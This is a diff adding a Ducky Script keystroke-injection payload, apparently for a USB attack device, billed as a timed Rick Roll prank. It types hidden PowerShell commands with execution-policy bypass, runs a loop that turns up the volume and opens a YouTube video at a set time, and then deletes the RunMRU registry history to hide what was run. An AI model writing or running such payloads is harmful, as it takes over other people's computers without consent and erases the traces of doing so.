@@ -1,0 +1,16 @@
+REM Rick Roll at specific time of day
+REM Set time according to:
+REM https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/prank/UnifiedRickRollWindows/README.md
+GUI r
+DELAY 200
+STRING cmd -A '/t:fe /k mode con: lines=1 cols=15'
+DELAY 200
+ENTER
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass  \$hi=0\; \$ho=\(Get-Date\).Hour.toString\(\)\; while \(\$hi -eq \'0\'\) \{ if \(\$ho -eq 1620 \) \{\$vol=new-object -com wscript.shell\; For\(\$i=0\; \$i -le 50\; \$i\+\+\)\{\$vol.SendKeys\(\[char\]175\)\}\; start \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" \; \$hi=1\; \} \$ho=\(Get-Date\).Hour.toString\(\)\+\(Get-Date\).Minute.toString\(\)\;\}
+DELAY 500
+ENTER
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
